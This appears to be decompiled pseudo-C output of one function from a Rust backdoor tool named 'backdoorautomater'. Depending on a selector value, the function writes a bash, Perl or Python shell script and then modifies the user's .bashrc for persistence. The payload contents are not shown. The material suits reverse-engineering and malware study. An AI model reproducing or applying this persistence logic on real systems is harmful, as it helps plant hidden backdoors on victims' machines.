void _ZN17backdoorautomater11shellscript13create_script17h6e2940071419697fE
               (undefined8 *param_1,undefined8 *param_2,undefined8 *param_3,undefined8 *param_4,
               char param_5)

{
  bool bVar1;
  int iVar2;
  undefined8 uVar3;
  undefined8 local_e8;
  undefined8 uStack_e0;
  undefined8 *local_d8;
  undefined8 local_d0;
  undefined8 uStack_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 uStack_b0;
  undefined8 local_a8;
  undefined4 local_98;
  undefined4 uStack_94;
  undefined4 uStack_90;
  undefined4 uStack_8c;
  undefined8 local_88;
  undefined *local_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined local_60 [16];
  undefined8 local_50;
  undefined local_48 [24];
  
  local_e8 = (undefined **)param_3[1];
  uStack_e0 = param_3[2] + (long)local_e8;
  iVar2 = _ZN96__LT_core__str__iter__Chars_u20_as_u20_core__iter__traits__double_ended__DoubleEndedIterator_GT_9next_back17h6ef03064f47cabe8E
                    (&local_e8);
  if ((iVar2 != 0x110000) && (iVar2 != 0x2f)) {
                    /* try { // try from 0015eebd to 0015eec4 has its CatchHandler @ 0015f18b */
    _ZN5alloc6string6String4push17h8dfcd488d6c0f12bE(param_3);
  }
  local_d8 = (undefined8 *)param_3[2];
  local_e8 = (undefined **)*param_3;
  uStack_e0 = param_3[1];
  local_d0 = *param_4;
  uStack_c8 = param_4[1];
  local_c0 = param_4[2];
                    /* try { // try from 0015eeec to 0015ef0a has its CatchHandler @ 0015f1b2 */
  _ZN5alloc3str17join_generic_copy17h6e3e6eb2fb0da332E(&local_b8,&local_e8,2,1,0);
  local_88 = local_a8;
  local_98 = (undefined4)local_b8;
  uStack_94 = local_b8._4_4_;
  uStack_90 = (undefined4)uStack_b0;
  uStack_8c = uStack_b0._4_4_;
                    /* try { // try from 0015ef22 to 0015ef3f has its CatchHandler @ 0015f1d6 */
  _ZN4core3ptr63drop_in_place_LT__u5b_alloc__string__String_u3b__u20_2_u5d__GT_17hfd07afc6d277b85dE
            (&local_e8);
  (*(code *)
    PTR__ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E_00368788
  )(local_48,param_2);
                    /* try { // try from 0015ef40 to 0015ef52 has its CatchHandler @ 0015f1aa */
  (*(code *)
    PTR__ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E_00368788
  )(local_60,&local_98);
  if (param_5 == '\x03') {
    local_68 = param_2[2];
    local_78 = (undefined *)*param_2;
    uStack_70 = param_2[1];
    local_a8 = param_1[2];
    local_b8 = (undefined **)*param_1;
    uStack_b0 = (code *)param_1[1];
    local_d8 = (undefined8 *)local_88;
    local_e8 = (undefined **)CONCAT44(uStack_94,local_98);
    uStack_e0 = CONCAT44(uStack_8c,uStack_90);
    uVar3 = _ZN17backdoorautomater11shellscript16write_shell_bash17hdd5bd13fe6aaa7b7E
                      (&local_78,&local_b8,&local_e8);
  }
  else if (param_5 == '\x02') {
    local_68 = param_2[2];
    local_78 = (undefined *)*param_2;
    uStack_70 = param_2[1];
    local_a8 = param_1[2];
    local_b8 = (undefined **)*param_1;
    uStack_b0 = (code *)param_1[1];
    local_d8 = (undefined8 *)local_88;
    local_e8 = (undefined **)CONCAT44(uStack_94,local_98);
    uStack_e0 = CONCAT44(uStack_8c,uStack_90);
    uVar3 = _ZN17backdoorautomater11shellscript16write_shell_perl17h0df48fc72a197687E
                      (&local_78,&local_b8,&local_e8);
  }
  else {
    if (param_5 != '\x01') {
      bVar1 = false;
      goto LAB_0015f095;
    }
    local_68 = param_2[2];
    local_78 = (undefined *)*param_2;
    uStack_70 = param_2[1];
    local_a8 = param_1[2];
    local_b8 = (undefined **)*param_1;
    uStack_b0 = (code *)param_1[1];
    local_d8 = (undefined8 *)local_88;
    local_e8 = (undefined **)CONCAT44(uStack_94,local_98);
    uStack_e0 = CONCAT44(uStack_8c,uStack_90);
                    /* try { // try from 0015efb1 to 0015f088 has its CatchHandler @ 0015f1c1 */
    uVar3 = _ZN17backdoorautomater11shellscript18write_shell_pyfile17h0bdea7fe03ab2920E
                      (&local_78,&local_b8,&local_e8);
  }
  _ZN17backdoorautomater9sanitizer18sanitize_return_fn17hb2c462d03cd2292cE(uVar3);
  bVar1 = true;
LAB_0015f095:
  local_d8 = (undefined8 *)local_50;
                    /* try { // try from 0015f0af to 0015f14b has its CatchHandler @ 0015f1db */
  uVar3 = _ZN17backdoorautomater11shellscript13modify_bashrc17h273b1bb4da291c9bE(&local_e8,param_5);
  _ZN17backdoorautomater9sanitizer18sanitize_return_fn17hb2c462d03cd2292cE(uVar3);
  local_e8 = &PTR_DAT_0032a7e8;
  uStack_e0 = 1;
  local_d8 = (undefined8 *)0x8;
  local_d0 = 0;
  uStack_c8 = 0;
  (*(code *)PTR__ZN3std2io5stdio6_print17h9670eaecb29bc3fcE_00368b80)(&local_e8);
  local_b8 = &local_78;
  uStack_b0 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h79b96a6ad6630cecE;
  local_e8 = &PTR_DAT_0032a7f8;
  uStack_e0 = 2;
  uStack_c8 = 0;
  local_d0 = 1;
  local_d8 = &local_b8;
  local_78 = local_48;
  (*(code *)PTR__ZN3std2io5stdio6_print17h9670eaecb29bc3fcE_00368b80)(&local_e8);
                    /* try { // try from 0015f14c to 0015f158 has its CatchHandler @ 0015f1d6 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_48);
  if (!bVar1) {
                    /* try { // try from 0015f15d to 0015f166 has its CatchHandler @ 0015f1a5 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_98);
                    /* try { // try from 0015f167 to 0015f16e has its CatchHandler @ 0015f1a0 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  }
  return;
}